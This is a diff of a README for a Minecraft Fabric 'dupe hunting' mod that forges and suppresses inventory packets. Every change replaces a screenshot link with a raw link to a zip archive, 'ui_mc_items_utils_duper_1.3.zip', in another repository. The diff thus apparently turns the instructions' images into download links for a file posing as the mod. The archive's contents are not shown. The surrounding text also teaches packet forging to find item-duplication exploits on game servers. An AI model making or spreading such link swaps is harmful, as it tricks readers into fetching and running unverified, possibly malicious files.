@@ -7,7 +7,7 @@ Dupe hunting mod. Incompatible with mac, needs fabric api
 
 - Open any inventory/container with the mod and you should see a few buttons.
 
-![image](https://user-images.githubusercontent.com/85349822/187423033-46da8cc0-2bc3-4215-8676-7c03628b8b8c.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - "Close without packet" closes your current gui (ScreenHandler) without sending a `CloseHandledScreenC2SPacket` to the server.
 
@@ -34,23 +34,23 @@ Dupe hunting mod. Incompatible with mac, needs fabric api
 
 - When clicking the "Fabricate packet" button you should see this window appear:
 
-![image](https://user-images.githubusercontent.com/85349822/187425789-f6b172d8-0745-4b43-b6b0-b746d4f51459.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - Clicking "Click Slot" will open up this window:
 
-![image](https://user-images.githubusercontent.com/85349822/187425967-aeefe828-e18e-4d28-a24c-64680ec55cbc.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - Enter the "Sync Id" and "Revision" value you see in the in-game gui to the "Click Slot Packet" gui.
 
 - The "Slot" value should be set to what slot you would like to click (starting from 0) you can generally find the location of gui slots on google for generic guis, e.g. double chest:
 
- ![image](https://user-images.githubusercontent.com/85349822/187426720-93f50986-cd1f-497a-a675-9ca9884fea13.png)
+ ![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - The "Button" field should be set to either: (0 is a leftclick, 1 is a rightclick, 0-8 and 40 will be explained below).
 
 - The "Action" field should be set to one of these options,
 
-![image](https://user-images.githubusercontent.com/85349822/187427492-2ed0da1f-351c-4471-a4cc-064fe70f1e62.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - "PICKUP" puts the item on the slot field on your cursor or visa versa, "QUICK_MOVE" is a shift click, "SWAP" acts as a hotbar or offhand swap (e.g. if your "Action" is set to "SWAP" and the "Button" set to 0-8, it will swap the item in the "Slot" field to one of those hotbar slots (starting from 0) or visa versa, "Button" being set to 40 will swap the item in the "Slot" field to your offhand or visa versa), "CLONE" acts as a middle click to clone items (only works in creative mode), "THROW" drops the item in the "Slot" field, "QUICK_CRAFT" is a bit complicated so you will have to experiment yourself or look into some code for it, "PICKUP_ALL" will pickup all the items matching to the item on your cursor, As long as "Slot" is within bounds of that gui.
 
@@ -59,11 +59,11 @@ Dupe hunting mod. Incompatible with mac, needs fabric api
 - Example of this feature:
 ---
 
-![image](https://user-images.githubusercontent.com/85349822/187429892-afc74514-c454-4f01-9307-c85ff37cf790.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - When clicking "Send" in the above image, It should drop the bedrock item on the ground.
 
-![image](https://user-images.githubusercontent.com/85349822/187430233-d94a497e-1698-4e01-a152-7002d1f1f6be.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 
 - Fabricate packet tutorial (Button Click):
@@ -73,11 +73,11 @@ Dupe hunting mod. Incompatible with mac, needs fabric api
 
 - When clicking the "Fabricate packet" button you should see this window appear:
 
-![image](https://user-images.githubusercontent.com/85349822/187425789-f6b172d8-0745-4b43-b6b0-b746d4f51459.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - Clicking "Button Click" will open up this window:
 
-![image](https://user-images.githubusercontent.com/85349822/187430861-11c62616-10e9-4b4b-bdb1-918c93b4e4a3.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 - Enter the "Sync Id" field in the "Button Click Packet" gui as the "Sync Id" value you will see in the in-game gui.
 
@@ -86,11 +86,11 @@ Dupe hunting mod. Incompatible with mac, needs fabric api
 - Example of this feature:
 ---
 
-![image](https://user-images.githubusercontent.com/85349822/187432355-a8b15cf9-e7c6-4d2b-b779-fd084de14002.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
-![image](https://user-images.githubusercontent.com/85349822/187432538-7f6b85f9-581b-442d-8027-9e0843b18939.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
-![image](https://user-images.githubusercontent.com/85349822/187432690-950626ac-7aef-4e46-8da1-1d294fcb9975.png)
+![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)
 
 ---
 
